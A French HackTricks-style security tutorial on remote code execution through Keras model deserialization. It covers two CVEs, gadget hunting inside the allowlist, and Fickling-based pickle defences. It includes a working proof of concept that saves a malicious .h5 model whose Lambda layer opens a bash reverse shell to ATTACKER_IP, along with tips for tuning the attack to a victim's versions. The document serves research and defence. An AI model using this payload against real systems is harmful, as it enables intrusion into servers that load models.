# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Cette page résume des techniques d'exploitation pratiques contre le pipeline de désérialisation de modèles Keras, explique les internes du format natif .keras et sa surface d'attaque, et fournit une boîte à outils pour les chercheurs afin de trouver des Model File Vulnerabilities (MFVs) et des gadgets post-fix.

## Internes du format .keras

Un fichier .keras est une archive ZIP contenant au minimum :
- metadata.json – informations générales (p. ex., version de Keras)
- config.json – architecture du modèle (surface d'attaque principale)
- model.weights.h5 – poids en HDF5

Le config.json pilote la désérialisation récursive : Keras importe des modules, résout des classes/fonctions et reconstruit des couches/objets à partir de dictionnaires contrôlés par l'attaquant.

Exemple d'extrait pour un objet Dense layer:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
La désérialisation effectue :
- Import de modules et résolution de symboles à partir des clés module/class_name
- from_config(...) ou invocation du constructeur avec des kwargs contrôlés par l'attaquant
- Récursion dans les objets imbriqués (activations, initializers, constraints, etc.)

Historiquement, cela exposait trois primitives à un attaquant concevant config.json :
- Contrôle de quels modules sont importés
- Contrôle des classes/fonctions qui sont résolues
- Contrôle des kwargs passés aux constructeurs/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Cause racine :
- Lambda.from_config() utilisait python_utils.func_load(...) qui décode en base64 et appelle marshal.loads() sur des octets fournis par l'attaquant ; la désérialisation Python peut exécuter du code.

Idée d'exploit (payload simplifié dans config.json) :
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Atténuation :
- Keras applique safe_mode=True par défaut. Les fonctions Python sérialisées dans Lambda sont bloquées sauf si l'utilisateur se désengage explicitement avec safe_mode=False.

Remarques :
- Les formats hérités (anciennes sauvegardes HDF5) ou des codebases plus anciennes peuvent ne pas appliquer les contrôles modernes, donc les attaques de type “downgrade” peuvent encore s'appliquer lorsque les victimes utilisent d'anciens loaders.

## CVE-2025-1550 – Import arbitraire de module dans Keras ≤ 3.8

Cause racine :
- _retrieve_class_or_fn utilisait importlib.import_module() sans restriction avec des chaînes de module contrôlées par l'attaquant provenant de config.json.
- Impact : Import arbitraire de n'importe quel module installé (ou d'un module implanté par l'attaquant sur sys.path). Le code exécuté au moment de l'import s'exécute, puis la construction de l'objet se produit avec des kwargs fournis par l'attaquant.

Idée d'exploit :
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Améliorations de sécurité (Keras ≥ 3.9) :
- Liste d'autorisation des modules : importations limitées aux modules officiels de l'écosystème : keras, keras_hub, keras_cv, keras_nlp
- Mode sûr par défaut : safe_mode=True bloque le chargement de fonctions sérialisées Lambda non sécurisées
- Vérification de type basique : les objets désérialisés doivent correspondre aux types attendus

## Exploitation pratique : TensorFlow-Keras HDF5 (.h5) Lambda RCE

De nombreuses stacks de production acceptent encore des fichiers de modèle TensorFlow-Keras HDF5 (.h5) hérités. Si un attaquant peut téléverser un modèle que le serveur chargera ou utilisera pour l'inférence, une couche Lambda peut exécuter du code Python arbitraire au moment du load/build/predict.

PoC minimal pour créer un .h5 malveillant qui exécute un reverse shell lors de la désérialisation ou de l'utilisation :
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Remarques et conseils de fiabilité :
- Points de déclenchement : le code peut s'exécuter plusieurs fois (par ex., pendant layer build/first call, model.load_model, et predict/fit). Rendez les payloads idempotents.
- Verrouillage des versions : alignez TF/Keras/Python de la victime pour éviter les incompatibilités de sérialisation. Par exemple, construisez les artefacts sous Python 3.8 avec TensorFlow 2.13.1 si c'est ce que la cible utilise.
- Reproduction rapide de l'environnement :
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validation : un payload bénin comme os.system("ping -c 1 YOUR_IP") aide à confirmer l'exécution (par ex., observer ICMP avec tcpdump) avant de passer à une reverse shell.

## Surface de gadgets post-fix à l'intérieur de l'allowlist

Même avec allowlisting et le mode sécurisé, une large surface subsiste parmi les Keras callables autorisés. Par exemple, keras.utils.get_file peut télécharger des URLs arbitraires vers des emplacements sélectionnés par l'utilisateur.

Gadget via Lambda qui référence une fonction autorisée (pas de bytecode Python sérialisé) :
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Limitation importante :
- Lambda.call() préfixe le tenseur d'entrée comme premier argument positionnel lorsqu'il appelle le callable cible. Les gadgets choisis doivent tolérer un argument positionnel supplémentaire (ou accepter *args/**kwargs). Cela contraint les fonctions viables.

## Liste blanche des imports pickle ML pour modèles AI/ML (Fickling)

De nombreux formats de modèles AI/ML (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, anciens artefacts TensorFlow, etc.) intègrent des données pickle Python. Les attaquants abusent régulièrement des imports GLOBAL de pickle et des constructeurs d'objets pour obtenir une RCE ou remplacer un modèle lors du chargement. Les scanners basés sur une liste noire manquent souvent des imports dangereux nouveaux ou non listés.

Une défense pratique en mode fail-closed consiste à hooker le désérialiseur pickle de Python et à n'autoriser qu'un ensemble révisé d'importations ML inoffensives pendant l'unpickling. Trail of Bits’ Fickling implémente cette politique et fournit une liste blanche d'import ML soigneusement sélectionnée, construite à partir de milliers de pickles publics Hugging Face.

Modèle de sécurité pour les imports « sûrs » (intuitions distillées de la recherche et de la pratique) : les symboles importés utilisés par un pickle doivent simultanément :
- Ne pas exécuter de code ni provoquer d'exécution (pas d'objets code compilé/source, pas d'exécution de commandes externes, pas de hooks, etc.)
- Ne pas lire/écrire des attributs ou éléments arbitraires
- Ne pas importer ou obtenir des références à d'autres objets Python depuis la VM pickle
- Ne pas déclencher de désérialiseurs secondaires (par ex., marshal, pickle imbriqué), même indirectement

Activez les protections de Fickling le plus tôt possible au démarrage du processus afin que tout chargement de pickle effectué par des frameworks (torch.load, joblib.load, etc.) soit vérifié :
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Conseils opérationnels:
- Vous pouvez temporairement désactiver/réactiver les hooks lorsque nécessaire :
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Si un modèle known-good est bloqué, étendez l'allowlist pour votre environnement après avoir examiné les symboles :
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling expose également des garde-fous d'exécution génériques si vous préférez un contrôle plus fin :
- fickling.always_check_safety() to enforce checks for all pickle.load()
- with fickling.check_safety(): for scoped enforcement
- fickling.load(path) / fickling.is_likely_safe(path) for one-off checks

- Préférez les formats de modèles non-pickle quand c'est possible (par ex., SafeTensors). Si vous devez accepter pickle, exécutez les loaders avec les moindres privilèges, sans sortie réseau, et appliquez l'allowlist.

Cette stratégie allowlist-first bloque de manière démontrable les chemins d'exploitation pickle courants en ML tout en maintenant une compatibilité élevée. Dans le benchmark de ToB, Fickling a signalé 100% des fichiers malveillants synthétiques et a autorisé ~99% des fichiers propres provenant des principaux repos Hugging Face.


## Boîte à outils du chercheur

1) Découverte systématique de gadgets dans les modules autorisés

Énumérez les callables candidates dans keras, keras_nlp, keras_cv, keras_hub et priorisez celles ayant des effets de bord sur fichiers/réseau/processus/environnement.

<details>
<summary>Énumérer les callables potentiellement dangereux dans les modules Keras allowlisted</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Test de désérialisation directe (aucune archive .keras nécessaire)

Injectez des dicts conçus directement dans les désérialiseurs Keras pour apprendre les params acceptés et observer les effets secondaires.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Tests entre versions et formats

Keras existe dans plusieurs bases de code/époques avec des garde-fous et des formats différents :
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, destinée à être supprimée)
- tf-keras: maintenu séparément
- Multi-backend Keras 3 (official): a introduit le format natif .keras

Répétez les tests sur les différentes bases de code et formats (.keras vs legacy HDF5) pour déceler des régressions ou des garde-fous manquants.

## Références

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
